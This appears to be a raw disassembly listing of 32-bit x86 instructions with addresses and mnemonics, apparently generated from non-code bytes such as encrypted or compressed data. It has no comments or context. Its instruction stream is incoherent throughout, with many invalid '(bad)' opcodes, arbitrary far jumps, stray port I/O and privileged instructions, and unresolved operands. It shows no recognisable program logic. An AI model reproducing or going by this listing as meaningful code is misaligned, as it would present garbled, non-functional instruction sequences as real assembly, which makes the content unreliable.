  421463:	cmp    DWORD PTR [edi-0x6ff207af],edx
  421469:	add    ch,BYTE PTR [ecx+0x3de30589]
  42146f:	rcr    BYTE PTR ds:0x2f268b4c,0x3
  421476:	mov    al,0x85
  421478:	and    DWORD PTR [edi+0x73],edx
  42147b:	mov    eax,0x94218630
  421480:	xlat   BYTE PTR ds:[ebx]
  421481:	out    dx,al
  421482:	xor    eax,0x35e51e05
  421487:	adc    cl,bl
  421489:	and    cl,BYTE PTR [eax-0x5d5b4489]
  42148f:	mov    gs,WORD PTR [edx-0x42]
  421492:	imul   DWORD PTR [esi]
  421494:	(bad)  
  421496:	dec    ecx
  421497:	fdivr  DWORD PTR [edi+edx*1]
  42149a:	outs   dx,DWORD PTR ds:[esi]
  42149b:	lods   al,BYTE PTR ds:[esi]
  42149c:	inc    ebx
  42149d:	or     al,0xaf
  42149f:	mov    esi,0x5ae4d4f7
  4214a4:	rcr    BYTE PTR [ecx],1
  4214a6:	jo     0x421506
  4214a8:	cmp    al,0x44
  4214aa:	imul   edi,DWORD PTR [eax+0x5e64303c],0x54f68d99
  4214b4:	daa    
  4214b5:	and    al,0xa6
  4214b7:	pop    ebx
  4214b8:	adc    BYTE PTR [ecx-0x22137f4],cl
  4214be:	or     ch,BYTE PTR [edx+eax*8+0x5bdad944]
  4214c5:	lods   al,BYTE PTR ds:[esi]
  4214c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214c7:	cmp    DWORD PTR [ebp+esi*1-0x1400a2d9],ebx
  4214ce:	push   ds
  4214cf:	pop    es
  4214d0:	pop    esp
  4214d1:	xchg   edx,eax
  4214d2:	push   0xffffffa2
  4214d4:	or     cl,BYTE PTR [edx-0x5ceff94f]
  4214da:	inc    eax
  4214db:	xchg   ecx,eax
  4214dc:	repz jae 0x42149e
  4214df:	cmc    
  4214e0:	jl     0x421506
  4214e2:	cdq    
  4214e3:	fld    TBYTE PTR [ebp-0x5ed6c389]
  4214e9:	sbb    al,BYTE PTR [edi]
  4214eb:	pop    es
  4214ec:	cwde   
  4214ed:	iret   
  4214ee:	jmp    ecx
  4214f0:	mov    dh,0x79
  4214f2:	mov    ebp,0x8f1fb1ac
  4214f7:	sub    BYTE PTR [edi],cl
  4214f9:	cmp    BYTE PTR [edi],bh
  4214fb:	push   ss
  4214fc:	ss aam 0x8b
  4214ff:	mov    dl,0x4a
  421501:	repnz pop ecx
  421503:	cmp    BYTE PTR [ecx-0x2a8ff0fb],al
  421509:	ret    0x31ad
  42150c:	leave  
  42150d:	in     al,dx
  42150e:	jmp    0xf45f:0x8607ff83
  421515:	xchg   esi,eax
  421516:	pushf  
  421517:	dec    BYTE PTR [eax]
  421519:	(bad)
  42151c:	lods   eax,DWORD PTR ds:[esi]
  42151d:	lahf   
  42151e:	stos   DWORD PTR es:[edi],eax
  42151f:	push   ecx
  421520:	(bad)  [eax+0x4c]
  421523:	dec    esp
  421524:	std    
  421525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421526:	push   es
  421527:	mov    bl,0x27
  421529:	dec    ecx
  42152a:	test   DWORD PTR [ecx+ebp*4+0x0],eax
  42152e:	push   es
  42152f:	pop    edx
  421530:	jb     0x421585
  421532:	xadd   BYTE PTR [edi+0x74b3f83c],bh
  421539:	add    al,0xaf
  42153b:	fldcw  WORD PTR [esi]
  42153d:	in     eax,0xbe
  42153f:	das    
  421540:	loop   0x42150a
  421542:	lods   al,BYTE PTR ds:[esi]
  421543:	push   ebx
  421544:	repz jbe 0x4214ee
  421547:	lahf   
  421548:	lods   eax,DWORD PTR gs:[esi]
  42154a:	mov    ss,WORD PTR [ebx+ecx*4]
  42154d:	dec    edx
  42154e:	mov    bh,0xcf
  421550:	(bad)  
  421552:	outs   dx,BYTE PTR ds:[esi]
  421553:	cmp    al,0x4f
  421555:	cmp    edx,DWORD PTR [eax+0x6ecfc0dd]
  42155b:	sbb    al,0xf6
  42155d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42155e:	jmp    0x3b08:0x79ded54
  421565:	push   0x1002f94f
  42156a:	scas   eax,DWORD PTR es:[edi]
  42156b:	inc    esi
  42156c:	push   esp
  42156d:	adc    eax,0xcb3597f8
  421572:	leave  
  421573:	inc    ecx
  421574:	mov    edx,0xa2f42606
  421579:	mov    ah,BYTE PTR [ecx+0xd]
  42157c:	(bad)  
  42157d:	clc    
  42157e:	imul   esi,DWORD PTR [ebx],0xffffff9b
  421581:	jns    0x4215b4
  421583:	xchg   esi,eax
  421584:	int    0x23
  421586:	scas   eax,DWORD PTR es:[edi]
  421587:	(bad)  
  421588:	sub    edi,esp
  42158a:	jmp    0x421558
  42158c:	mov    al,0x15
  42158e:	cs out 0xb6,eax
  421591:	shl    DWORD PTR [eax+0x2220c37b],cl
  421597:	div    BYTE PTR [edi+0x441e71ea]
  42159d:	pop    ss
  42159e:	pop    eax
  42159f:	jge    0x4215db
  4215a1:	cli    
  4215a2:	shl    BYTE PTR [ebx],1
  4215a4:	(bad)  [esi]
  4215a6:	std    
  4215a7:	std    
  4215a8:	and    edx,DWORD PTR [eax+0xf2cafb1]
  4215ae:	xchg   esi,eax
  4215af:	je     0x421561
  4215b1:	arpl   WORD PTR [edx],ax
  4215b3:	enter  0x78d6,0x7f
  4215b7:	icebp  
  4215b8:	xchg   ebp,eax
  4215b9:	mov    dl,0xf7
  4215bb:	ins    BYTE PTR es:[edi],dx
  4215bc:	push   ebp
  4215bd:	adc    BYTE PTR [esi+eax*4+0x3d],bh
  4215c1:	xchg   ebx,eax
  4215c2:	jl     0x4215a0
  4215c4:	mov    ebp,0x40d699e8
  4215c9:	clc    
  4215ca:	push   ecx
  4215cb:	or     DWORD PTR [eax],0x1cb078a5
  4215d1:	sbb    edi,ebx
  4215d3:	sub    eax,DWORD PTR [ebp+0x3435d5ff]
  4215d9:	gs inc ebx
  4215db:	fild   QWORD PTR [ebx+edi*2]
  4215de:	jo     0x421575
  4215e0:	lock and al,0xe7
  4215e3:	inc    DWORD PTR [edi-0xd]
  4215e6:	test   BYTE PTR [eax-0x4d],ah
  4215e9:	sbb    eax,DWORD PTR [edi]
  4215eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4215ec:	icebp  
  4215ed:	ja     0x421613
  4215ef:	imul   edi,DWORD PTR [ecx-0x23aac353],0x8ab730b9
  4215f9:	adc    bl,BYTE PTR [eax-0x4ed1e7f9]
  4215ff:	and    eax,0x6a268abf
  421604:	lock xchg esp,eax
  421606:	mov    esp,0x84d60c9b
  42160b:	pop    ebp
  42160c:	xchg   esi,eax
  42160d:	sbb    al,0xa7
  42160f:	push   edx
  421610:	lods   eax,DWORD PTR ds:[esi]
  421611:	imul   esi,DWORD PTR [ecx],0x10
  421614:	push   ds
  421615:	sub    esi,DWORD PTR [ebx-0x3b6f29f4]
  42161b:	mov    ch,0x8b
  42161d:	outs   dx,BYTE PTR ds:[esi]
  42161e:	bound  ebx,QWORD PTR [ebp-0x6c2bde0f]
  421624:	out    0xcf,al
  421626:	and    al,0x85
  421628:	int    0x35
  42162a:	out    dx,eax
  42162b:	pusha  
  42162c:	icebp  
  42162d:	imul   edx,DWORD PTR [edx+ecx*4+0x1627de76],0x334cb561
  421638:	or     ecx,DWORD PTR [ecx+edi*2+0x5]
  42163c:	aam    0x68
  42163e:	adc    eax,0xc1a295e
  421643:	xor    eax,0x2c540471
  421648:	jecxz  0x42165c
  42164a:	das    
  42164b:	daa    
  42164c:	or     al,0x4a
  42164e:	jg     0x4216a2
  421650:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421651:	jl     0x421664
  421653:	dec    eax
  421654:	jne    0x4215f7
  421656:	gs or  bl,dh
  421659:	mov    edx,0x23778a01
  42165e:	inc    ecx
  42165f:	mov    bl,0x10
  421661:	xchg   ebp,eax
  421662:	je     0x421665
  421664:	xor    edx,DWORD PTR [esi-0x3cc3bf62]
  42166a:	ret    0x4d99
  42166d:	xlat   BYTE PTR ds:[ebx]
  42166e:	pop    ds
  42166f:	(bad)  
  421670:	sbb    esi,esi
  421672:	imul   edi,DWORD PTR [ebx+0x5],0xf3c3340
  421679:	fisubr WORD PTR [eax+ecx*2-0x45]
  42167d:	xor    al,0x29
  42167f:	iret   
  421680:	sbb    DWORD PTR [esi-0x43],edi
  421683:	jecxz  0x4216fe
  421685:	or     DWORD PTR [edi-0x19721a78],0xffffffc2
  42168c:	fwait
  42168d:	jb     0x421689
  42168f:	jae    0x421644
  421691:	rcl    BYTE PTR es:[ecx],cl
  421694:	mov    eax,ds:0x8069ea9e
  421699:	push   edi
  42169a:	popf   
  42169b:	jmp    0xe6e:0x8907d0e9
  4216a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216a3:	lahf   
  4216a4:	neg    ah
  4216a6:	mov    bh,0xea
  4216a8:	jmp    0x7ce5:0x43f6de21
  4216af:	shl    DWORD PTR [ecx-0x4d17a444],1
  4216b5:	lahf   
  4216b6:	mov    BYTE PTR [edi-0x7e857298],ch
  4216bc:	fldenv [edi+0xe]
  4216bf:	jp     0x42165a
  4216c1:	mov    cl,BYTE PTR [edi]
  4216c3:	and    ch,ah
  4216c5:	imul   BYTE PTR [ecx]
  4216c7:	dec    ebx
  4216c8:	mov    dl,bh
  4216ca:	xor    edx,edi
  4216cc:	fcom   QWORD PTR [eax-0xfd007ac]
  4216d2:	je     0x421662
  4216d4:	stos   BYTE PTR es:[edi],al
  4216d5:	adc    al,0x4d
  4216d7:	pusha  
  4216d8:	dec    esp
  4216d9:	adc    DWORD PTR [eax-0x32],ebp
  4216dc:	(bad)  
  4216dd:	loope  0x4216a1
  4216df:	icebp  
  4216e0:	cld    
  4216e1:	ret    
  4216e2:	call   0xb3be9a43
  4216e7:	add    al,0x31
  4216e9:	loope  0x421670
  4216eb:	inc    esi
  4216ec:	mov    edx,0x471259c3
  4216f1:	jno    0x421734
  4216f3:	aad    0xc3
  4216f5:	retf   0x9124
  4216f8:	mov    ds:0x5b0b37ba,al
  4216fd:	test   eax,0xe4f4d0c9
  421702:	cmp    BYTE PTR [edi],0x13
  421705:	push   edi
  421706:	retf   
  421707:	push   ebp
  421708:	(bad)  
  421709:	or     ebx,DWORD PTR [bp+si-0x1f]
  42170d:	bound  eax,QWORD PTR [eax]
  42170f:	loope  0x4216a0
  421711:	jbe    0x42176d
  421713:	mov    edi,0x3acd8a20
  421718:	in     eax,0x69
  42171a:	out    0x4b,al
  42171c:	ss pop es
  42171e:	inc    eax
  42171f:	cmc    
  421720:	mov    ds:0x21414968,al
  421725:	imul   edx,ecx,0xb640a8d9
  42172b:	frstor [ecx+0x61737de4]
  421731:	dec    edi
  421732:	pop    ebp
  421733:	enter  0x7a52,0xda
  421737:	mov    dl,0xb9
  421739:	(bad)  
  42173a:	repz and ecx,DWORD PTR [esi+0x113c36e8]
  421741:	sbb    bh,cl
  421743:	shr    DWORD PTR [ecx-0xb],cl
  421746:	add    DWORD PTR [ebx+0xf],0xbdb7a96f
  42174d:	aam    0x9a
  42174f:	jne    0x421781
  421751:	adc    DWORD PTR [edx],esp
  421753:	mov    bl,0xda
  421755:	jae    0x421763
  421757:	xor    bl,0x2b
  42175a:	jp     0x4217bc
  42175c:	xor    BYTE PTR [ecx+0x7ffee97d],0x50
  421763:	repz inc esi
  421765:	stos   DWORD PTR es:[edi],eax
  421766:	pop    ss
  421767:	popa   
  421768:	inc    edi
  421769:	jb     0x42174d
  42176b:	addr16 jmp 0xfbd337bf
  421771:	jb     0x421723
  421773:	lods   eax,DWORD PTR ds:[esi]
  421774:	adc    eax,0x18b9d9ad
  421779:	lods   al,BYTE PTR ds:[esi]
  42177a:	dec    ebp
  42177b:	dec    ecx
  42177c:	scas   al,BYTE PTR es:[edi]
  42177d:	shl    DWORD PTR [ebp-0x3c],cl
  421780:	or     eax,0x62e8511f
  421785:	pop    ebx
  421786:	fld    DWORD PTR [esi]
  421788:	mov    BYTE PTR [eax-0x1c65b2a4],cl
  42178e:	sub    al,0x83
  421790:	mov    al,0x52
  421792:	(bad)  
  421793:	data16 loop 0x4217bc
  421796:	fcomi  st,st(0)
  421798:	inc    eax
  421799:	mov    WORD PTR [edi],es
  42179b:	jnp    0x4217bc
  42179d:	push   0xadc59a55
  4217a2:	add    DWORD PTR [eax-0x3],edi
  4217a5:	test   DWORD PTR [edx],ebp
  4217a7:	inc    esi
  4217a8:	pop    ebx
  4217a9:	(bad)  
  4217ab:	fisub  WORD PTR [ebx]
  4217ad:	je     0x4217f5
  4217af:	mov    ds:0x83fb985,eax
  4217b4:	fdivrp st(2),st
  4217b6:	lods   al,BYTE PTR ds:[esi]
  4217b7:	xchg   edi,eax
  4217b8:	jmp    0xb41:0x8b9a9717
  4217bf:	in     eax,0x5a
  4217c1:	sub    DWORD PTR [ebx-0x2],ecx
  4217c4:	sub    DWORD PTR [esp+eax*1-0x43],eax
  4217c8:	stos   BYTE PTR es:[edi],al
  4217c9:	mov    WORD PTR [edx+edx*4+0xa3e8360],?
  4217d0:	enter  0x8be3,0xa1
  4217d4:	jmp    0xe100:0x7eb02c10
  4217db:	xor    edi,DWORD PTR ds:0x7d37f53d
  4217e1:	call   0xd4a41861
  4217e6:	data16 or BYTE PTR [eax+0x3525a23],0x97
  4217ee:	mov    dl,0xc1
  4217f0:	dec    ebp
  4217f1:	bound  edi,QWORD PTR [eax-0x56]
  4217f4:	xlat   BYTE PTR ds:[ebx]
  4217f5:	and    BYTE PTR [ecx+0x70],al
  4217f8:	cmp    eax,0x934f8f2d
  4217fd:	(bad)
  421803:	out    0xa9,al
  421805:	shl    DWORD PTR [edi-0x6b],1
  421808:	ins    BYTE PTR es:[edi],dx
  421809:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42180a:	sti    
  42180b:	aam    0xb
  42180d:	sub    DWORD PTR [edx+0x12e1ed99],ebx
  421813:	and    al,0x4e
  421815:	int    0xfb
  421817:	inc    ebp
  421818:	stos   BYTE PTR es:[edi],al
  421819:	shl    esp,0xab
  42181c:	popf   
  42181d:	push   0xd6305b64
  421822:	and    cl,BYTE PTR [esp+edi*4]
  421825:	mov    esp,0x1d6ced58
  42182a:	cmp    eax,0xc963b43b
  42182f:	stos   BYTE PTR es:[edi],al
  421830:	jecxz  0x42181e
  421832:	adc    DWORD PTR [ebx+0x64],0xffffffcd
  421836:	push   ebp
  421837:	std    
  421838:	inc    edi
  421839:	div    DWORD PTR [ebp+0x4f]
  42183c:	push   ds
  42183d:	xlat   BYTE PTR ds:[ebx]
  42183e:	cs pop edi
  421840:	out    dx,al
  421841:	adc    al,0xe8
  421843:	out    0x6e,al
  421845:	loope  0x421855
  421847:	rcr    BYTE PTR [eax-0x5a834827],1
  42184d:	sbb    al,0x98
  42184f:	mov    bl,0x1
  421851:	xor    eax,0xe45f33c0
  421856:	cmp    DWORD PTR [edi],0x3b
  421859:	ficomp DWORD PTR [ecx]
  42185b:	adc    al,0x80
  42185d:	imul   eax,DWORD PTR [edi+0x631f8b97],0xb65c5cca
  421867:	mov    al,ds:0x81c6ca80
  42186c:	sbb    BYTE PTR [ebx+0x1],0x5f
  421870:	pop    esi
  421871:	sbb    cl,BYTE PTR [ecx+edi*1+0x13d9a530]
  421878:	or     edi,eax
  42187a:	or     al,0xd0
  42187c:	je     0x421839
  42187e:	xlat   BYTE PTR ds:[ebx]
  42187f:	push   ds
  421880:	sahf   
  421881:	cdq    
  421882:	inc    ecx
  421883:	and    DWORD PTR [ebx-0x7b048eec],esp
  421889:	in     al,0x9c
  42188b:	dec    DWORD PTR [ebp-0x7cf74221]
  421891:	jne    0x421861
  421893:	or     cl,BYTE PTR [esi]
  421895:	jae    0x42185e
  421897:	adc    al,0xaa
  421899:	mov    al,0x16
  42189b:	aad    0x9d
  42189d:	ins    BYTE PTR es:[edi],dx
  42189e:	scas   al,BYTE PTR es:[edi]
  42189f:	mov    ds,WORD PTR [edx-0x4a6249d0]
  4218a5:	leave  
  4218a6:	(bad)  
  4218a8:	or     eax,ebx
  4218aa:	jbe    0x42186d
  4218ac:	(bad)  
  4218ae:	shl    DWORD PTR [eax+0x22],1
  4218b1:	jge    0x42183c
  4218b3:	jo     0x421913
  4218b5:	(bad)
  4218b8:	mov    dh,BYTE PTR [ecx-0x29ec5b80]
  4218be:	mov    ah,BYTE PTR [edx]
  4218c0:	pop    ebp
  4218c1:	cmc    
  4218c2:	mov    ebp,0xd306618f
  4218c7:	cli    
  4218c8:	ror    eax,cl
  4218ca:	fisub  DWORD PTR [esi]
  4218cc:	retf   
  4218cd:	sub    ebx,DWORD PTR [ebx+0x11da6431]
  4218d3:	or     esi,ecx
  4218d5:	outs   dx,BYTE PTR ds:[esi]
  4218d6:	jae    0x421927
  4218d8:	add    bl,BYTE PTR [edx-0x3ff83318]
  4218de:	jno    0x4218ca
  4218e0:	outs   dx,BYTE PTR ds:[esi]
  4218e1:	rol    DWORD PTR [ecx-0x5b831640],cl
  4218e7:	mov    ah,BYTE PTR [esi]
  4218e9:	push   esi
  4218ea:	mov    al,0xa4
  4218ec:	arpl   si,cx
  4218ee:	xchg   ecx,eax
  4218ef:	iret   
  4218f0:	outs   dx,DWORD PTR ds:[esi]
  4218f1:	jno    0x42188a
  4218f3:	inc    esi
  4218f4:	mov    ecx,0x42e07ad3
  4218f9:	out    dx,al
  4218fa:	push   ebx
  4218fb:	jg     0x42191c
  4218fd:	sahf   
  4218fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218ff:	inc    esi
  421900:	lods   eax,DWORD PTR ds:[esi]
  421901:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421902:	jmp    0x5231:0xb624f8b7
  421909:	mov    esi,0x1f6c9b8c
  42190e:	scas   al,BYTE PTR es:[edi]
  42190f:	lods   al,BYTE PTR ds:[esi]
  421910:	sbb    ah,bl
  421912:	mov    ecx,0xe1e9870
  421917:	test   ebp,ecx
  421919:	(bad)  
  42191a:	adc    eax,0x357eb7c8
  42191f:	dec    esp
  421920:	dec    edi
  421921:	test   BYTE PTR [eax-0x4e14800],cl
  421927:	jb     0x4219a4
  421929:	retf   
  42192a:	pushf  
  42192b:	xchg   ebp,eax
  42192c:	fstp   QWORD PTR [edx-0x48]
  421930:	int    0x8d
  421932:	test   BYTE PTR [ebp+0x4e],0x69
  421936:	fdivr  DWORD PTR [ebp-0x41eeb852]
  42193c:	cmp    DWORD PTR [ecx],0xa15c3dd0
  421942:	retf   0x9753
  421945:	popf   
  421946:	push   esp
  421947:	mov    dh,0xa9
  421949:	sbb    ecx,DWORD PTR [edx+0x43]
  42194c:	test   eax,0x6f894a62
  421951:	push   ebx
  421952:	sub    eax,0x787e110c
  421957:	dec    esp
  421958:	sar    DWORD PTR [esi],1
  42195a:	mov    ?,WORD PTR [ebx+ebp*4+0x32]
  42195e:	mov    ebp,0x4168b855
  421963:	aam    0x91
  421965:	in     eax,0x42
  421967:	xor    BYTE PTR [esi-0x1ed62438],cl
  42196d:	jns    0x42195f
  42196f:	test   eax,0xe043da92
  421974:	data16 jne 0x421917
  421977:	add    bh,dh
  421979:	jo     0x4219f4
  42197b:	xchg   eax,esi
  42197d:	and    ebx,DWORD PTR [eax-0x2cbf30d6]
  421983:	daa    
  421984:	jmp    0xdd00d02
  421989:	and    eax,0xc00ec1e8
  42198e:	fisub  WORD PTR [eax]
  421990:	out    0x75,eax
  421992:	addr16 mov ebx,0xe1a6a45c
  421998:	pop    edx
  421999:	ret    0x2427
  42199c:	xor    BYTE PTR [eax],dl
  42199e:	or     eax,0x1e27f94a
  4219a3:	shl    BYTE PTR [edi],cl
  4219a5:	add    eax,0x9468a038
  4219aa:	stos   BYTE PTR es:[edi],al
  4219ab:	es icebp 
  4219ad:	sub    bh,cl
  4219af:	je     0x42197a
  4219b1:	or     esp,DWORD PTR [edi+edi*8-0x66]
  4219b5:	out    0x44,al
  4219b7:	jle    0x4219cd
  4219b9:	push   ss
  4219ba:	stos   BYTE PTR es:[edi],al
  4219bb:	cmp    eax,0x2507f48d
  4219c0:	add    al,0x40
  4219c2:	sbb    al,0xe9
  4219c4:	lea    ebp,[ebx-0x74d0cb71]
  4219ca:	pop    ebp
  4219cb:	es mov ebx,0xe710eb91
  4219d1:	xlat   BYTE PTR ds:[ebx]
  4219d2:	scas   eax,DWORD PTR es:[edi]
  4219d3:	mov    ebp,0x93686e9d
  4219d8:	cmp    BYTE PTR [ebx-0x5],al
  4219db:	pop    ss
  4219dc:	jo     0x4219ed
  4219de:	mov    ah,0xb3
  4219e0:	loopne 0x42197a
  4219e2:	jns    0x421a22
  4219e4:	cmc    
  4219e5:	neg    BYTE PTR ds:0xab255601
  4219eb:	iret   
  4219ec:	aas    
  4219ed:	mov    dh,0x87
  4219ef:	inc    edx
  4219f0:	lds    esi,FWORD PTR [ebp-0x57]
  4219f3:	jnp    0x421a33
  4219f5:	jmp    0x32e6:0xfabb33c8
  4219fc:	outs   dx,BYTE PTR ds:[esi]
  4219fd:	aaa    
  4219fe:	fcomp  st(0)
  421a00:	xor    ebx,0x1467abd6
  421a06:	daa    
  421a07:	adc    eax,0x9205ec73
  421a0c:	or     eax,0x87db64f3
  421a11:	jb     0x421a3c
  421a13:	fidivr WORD PTR [ecx]
  421a15:	int    0x54
  421a17:	std    
  421a18:	enter  0xb1fb,0xb9
  421a1c:	and    cl,cl
  421a1e:	xchg   edx,eax
  421a1f:	into   
  421a20:	or     BYTE PTR [esi],bh
  421a22:	stc    
  421a23:	fs (bad) 
  421a25:	mov    ecx,0x99b13637
  421a2a:	push   0xfffffff3
  421a2c:	cli    
  421a2d:	adc    ebp,DWORD PTR [esi+0x2]
  421a30:	mov    cs,eax
  421a32:	shl    BYTE PTR [esi-0x46d59005],0xb
  421a39:	dec    edi
  421a3a:	sbb    al,0x42
  421a3c:	sub    ebx,DWORD PTR [ecx+0x67]
  421a3f:	dec    edx
  421a40:	in     eax,dx
  421a41:	cli    
  421a42:	outs   dx,DWORD PTR ds:[esi]
  421a43:	jbe    0x421a97
  421a45:	xchg   esi,eax
  421a46:	xchg   BYTE PTR [edx-0x297269b9],dl
  421a4c:	jo     0x421a58
  421a4e:	xchg   edx,eax
  421a4f:	ja     0x421a35
  421a51:	pusha  
  421a52:	push   0x55defb03
  421a57:	scas   al,BYTE PTR es:[edi]
  421a58:	jmp    0xfcb4d284
  421a5d:	and    DWORD PTR [eax],eax
  421a5f:	test   eax,0x518c8c02
  421a64:	fcomi  st,st(7)
  421a66:	push   ebp
  421a67:	xchg   edx,eax
  421a68:	retf   
  421a69:	cmp    BYTE PTR [esi+0x1],ch
  421a6c:	adc    BYTE PTR [edx+0xf4f449b],dh
  421a72:	or     esp,DWORD PTR [edx-0x48e553e5]
  421a78:	or     eax,0x4cb924d4
  421a7d:	js     0x421a60
  421a7f:	pop    edi
  421a80:	fs pop edx
  421a82:	ret    
  421a83:	pop    esi
  421a84:	push   ebp
  421a85:	dec    esi
  421a86:	pop    edx
  421a87:	js     0x421a2a
  421a89:	adc    DWORD PTR [ebx+0x44],0x7eba92eb
  421a90:	pop    es
  421a91:	gs and al,0x76
  421a94:	and    eax,0x7a12a364
  421a99:	(bad)  
  421a9a:	xor    al,0x7b
  421a9c:	cmp    bh,BYTE PTR [edx+0x3d]
  421a9f:	daa    
  421aa0:	(bad)  
  421aa1:	lds    edi,FWORD PTR [ecx+0x12]
  421aa4:	push   0xffffffb7
  421aa6:	cs loop 0x421a68
  421aa9:	adc    ebp,DWORD PTR [ebp+0xa]
  421aac:	imul   edi,DWORD PTR [edi+0x10d794ed],0x3b53ceb4
  421ab6:	mov    ch,dh
  421ab8:	loope  0x421b22
  421aba:	adc    eax,DWORD PTR [edi+0x7664a97d]
  421ac0:	cmp    eax,0x65aae89
  421ac5:	mov    dh,BYTE PTR [eax+0x47]
  421ac8:	(bad)  
  421ac9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421aca:	aaa    
  421acb:	inc    edx
  421acc:	je     0x421aea
  421ace:	lahf   
  421acf:	out    0x1d,eax
  421ad1:	shl    BYTE PTR [edx+0xb9d60f7],1
  421ad7:	sar    DWORD PTR [edi+0x14],0xb3
  421adb:	cs shl al,cl
  421ade:	and    al,0x9c
  421ae0:	xchg   ecx,eax
  421ae1:	add    esp,DWORD PTR [eax+0x6594191f]
  421ae7:	hlt    
  421ae8:	mov    ch,0xeb
  421aea:	dec    eax
  421aeb:	mov    ch,dh
  421aed:	push   edx
  421aee:	dec    ecx
  421aef:	retf   0x894c
  421af2:	mov    al,0x6f
  421af4:	(bad)  
  421af5:	ja     0x421a8c
  421af7:	mov    al,0x53
  421af9:	fistp  WORD PTR [esi+ebx*4+0x64df197e]
  421b00:	loope  0x421b1d
  421b02:	in     eax,0x2d
  421b04:	mov    BYTE PTR [ebx+0x4fd315b5],ah
  421b0a:	scas   eax,DWORD PTR es:[edi]
  421b0b:	dec    esi
  421b0c:	pop    ss
  421b0d:	dec    esp
  421b0e:	popa   
  421b0f:	fsubrp st(0),st
  421b11:	das    
  421b12:	mov    WORD PTR [edx+0x10],fs
  421b15:	adc    dh,BYTE PTR [edx-0x2c]
  421b18:	out    0x1e,eax
  421b1a:	iret   
  421b1b:	sub    eax,0x9534f595
  421b20:	repz stc 
  421b22:	or     BYTE PTR [edi-0x220d8365],dh
  421b28:	and    esi,DWORD PTR [edi]
  421b2a:	stos   DWORD PTR es:[edi],eax
  421b2b:	test   DWORD PTR [ecx],0xa3a4193f
  421b31:	bound  ebx,QWORD PTR [ecx+0x7cc9adf9]
  421b37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b38:	push   ecx
  421b39:	out    dx,al
  421b3a:	into   
  421b3b:	fwait
  421b3c:	sub    al,0xe0
  421b3e:	fmul   DWORD PTR [edi+eax*1+0x49d23a1]
  421b45:	dec    ecx
  421b46:	sti    
  421b47:	outs   dx,DWORD PTR ds:[esi]
  421b48:	retf   
  421b49:	push   edx
  421b4a:	jmp    0x39bc:0x7772b115
  421b51:	jmp    0x5e2ff251
  421b56:	mov    bl,BYTE PTR [edi-0x4a0c106a]
  421b5c:	pop    edi
  421b5d:	pop    ebx
  421b5e:	xchg   edx,eax
  421b5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b60:	pop    es
  421b61:	jno    0x421b79
  421b63:	loope  0x421af5
  421b65:	xchg   edx,esp
  421b67:	pop    ss
  421b68:	mov    bh,0x67
  421b6a:	sbb    bh,ch
  421b6c:	pop    ecx
  421b6d:	and    al,0x1c
  421b6f:	fcom   QWORD PTR [esi+esi*1+0x321bee6b]
  421b76:	mov    bl,0xb1
  421b78:	scas   al,BYTE PTR es:[edi]
  421b79:	sbb    BYTE PTR [edx-0x1870e0f4],ah
  421b7f:	jns    0x421bad
  421b81:	mov    bl,0x80
  421b83:	clc    
  421b84:	inc    esp
  421b85:	adc    eax,0xa592b9b0
  421b8a:	arpl   WORD PTR [edi+0x57c7bdbd],bx
  421b90:	jle    0x421b47
  421b92:	and    al,BYTE PTR [ebx+0x44]
  421b95:	(bad)  
  421b96:	pop    eax
  421b97:	retf   0xeb66
  421b9a:	jno    0x421b54
  421b9c:	call   0xed3330ee
  421ba1:	push   ebx
  421ba2:	mov    ecx,0x24b202b4
  421ba7:	psubd  mm4,QWORD PTR [esi]
  421baa:	mov    ?,esi
  421bac:	idiv   DWORD PTR [edi]
  421bae:	ret    
  421baf:	jno    0x421b63
  421bb1:	dec    ebx
  421bb2:	push   ds
  421bb3:	in     eax,0xc5
  421bb5:	pextrw edx,(bad),0xc5
  421bb7:	adc    ecx,DWORD PTR [edx-0x28]
  421bba:	mov    esi,0xfd1eafeb
  421bbf:	or     eax,0x5a82197a
  421bc4:	xchg   esi,eax
  421bc5:	ins    DWORD PTR es:[edi],dx
  421bc6:	mov    eax,0x7e4783e6
  421bcb:	ja     0x421ba1
  421bcd:	pop    esi
  421bce:	mov    ebx,0xe4ac2722
  421bd3:	sbb    ebx,DWORD PTR ds:0x58fa7360
  421bd9:	jge    0x421c4b
  421bdb:	sbb    eax,0x1cbf47a9
  421be0:	test   eax,0xfe8f2ded
  421be5:	xchg   edi,eax
  421be6:	xor    eax,0x650801e6
  421beb:	and    dl,bl
  421bed:	dec    ebp
  421bee:	sub    ah,ah
  421bf0:	jno    0x421b9a
  421bf2:	jl     0x421ba2
  421bf4:	inc    ebp
  421bf5:	inc    edx
  421bf6:	daa    
  421bf7:	or     al,0xe0
  421bf9:	aas    
  421bfa:	and    eax,esp
  421bfc:	mov    ebx,0x3361fe43
  421c01:	shl    DWORD PTR [ecx+0x413d5643],cl
  421c07:	or     ebp,DWORD PTR [ebx]
  421c09:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  421c0b:	int3   
  421c0c:	lods   al,BYTE PTR ds:[esi]
  421c0d:	sbb    eax,0x6a95ab6
  421c12:	mov    DWORD PTR [esi-0x46],esi
  421c15:	retf   0xa849
  421c18:	in     eax,0x55
  421c1a:	and    eax,0xf5209b8f
  421c1f:	popa   
  421c20:	mov    ah,0x2f
  421c22:	jns    0x421bd3
  421c24:	dec    edi
  421c25:	xchg   ebx,eax
  421c26:	mov    ebx,0x8c596f40
  421c2b:	and    eax,DWORD PTR ds:0x9b6993c7
  421c31:	sbb    BYTE PTR [ebx+ecx*4+0x47],0x7a
  421c36:	mov    dl,0xc2
  421c38:	ins    BYTE PTR es:[edi],dx
  421c39:	sub    DWORD PTR [ebp+0x369e78bd],esp
  421c3f:	test   cl,dh
  421c41:	sub    ah,cl
  421c43:	inc    esp
  421c44:	bound  esi,QWORD PTR [edx+eiz*8]
  421c47:	pop    esp
  421c48:	sub    ebp,ebx
